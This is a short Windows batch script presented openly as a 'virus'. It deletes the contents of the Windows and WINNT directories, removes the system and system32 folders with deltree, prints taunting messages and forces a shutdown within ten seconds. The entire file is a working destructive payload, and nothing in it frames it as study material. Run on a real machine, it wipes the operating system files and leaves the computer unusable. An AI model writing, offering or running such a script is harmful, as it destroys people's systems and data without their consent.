   @echo off

   echo Say bye to Mr. computer!!!
   If Exist c:\WINNT Del c:\WINNT\*.*
   If Exist c:\WINDOWS del C:\WINDOWS\*.*
   cls
   If Exist c:\WINNT\system Deltree c:\WINNT\system
   If Exist c:\WINDOWS\system deltree c:\WINDOWS\system
   If Exist c:\WINDOWS\system32 deltree c:\WINDOWS\system32
   cls
   echo SYSTEM FILES DELETED!!!
   echo HAVE A NICE DAY!!!:P
   SHUTDOWN -s -t 10 -c "Need to restart your computer to finish installing virus..."
   Exit
